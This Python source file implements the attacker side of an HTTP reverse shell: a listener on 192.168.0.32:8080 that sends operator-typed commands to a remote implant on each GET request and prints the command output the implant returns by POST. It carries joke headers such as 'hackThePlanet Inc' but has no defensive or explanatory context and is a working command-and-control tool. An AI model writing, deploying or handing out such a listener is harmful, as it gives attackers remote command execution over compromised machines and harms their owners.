from http.server import BaseHTTPRequestHandler, HTTPServer

host_data = ['192.168.0.32', 8080]


class ReverseShellHandler(BaseHTTPRequestHandler):

    def do_GET(self):
        try:
            cmd = input("#> ")
            self.send_response(200)
            self.send_header("Content-type", "text/html; charset=UTF-8")
            self.send_header("x-powered-by", "hackThePlanet Inc")
            self.send_header("server", "Hacme Labs Inc")
            self.end_headers()
            self.wfile.write(cmd.encode())
        except Exception as e:
            print(f"=(  {e}")

    def do_POST(self):
        try:
            self.send_response(200)
            self.send_header("Content-type", "text/html; charset=UTF-8")
            self.send_header("x-powered-by", "hackThePlanet Inc")
            self.send_header("server", "Hacme Labs Inc")
            self.end_headers()
            length = int(self.headers['Content-Length'])
            posted_data = self.rfile.read(length)
            print(posted_data)
        except Exception as e:
            print(f"=(   {e}")

if __name__ == '__main__':

    try:
        server = HTTPServer
        httpd = server((host_data[0], host_data[1]), ReverseShellHandler)
        print(f"Serving {host_data}")
        httpd.serve_forever()
        httpd.server_close()
        print("_____ THATS ALL FOLKS!")

    except Exception as e:
        print(f"Houston, we have a problem here. {e}")
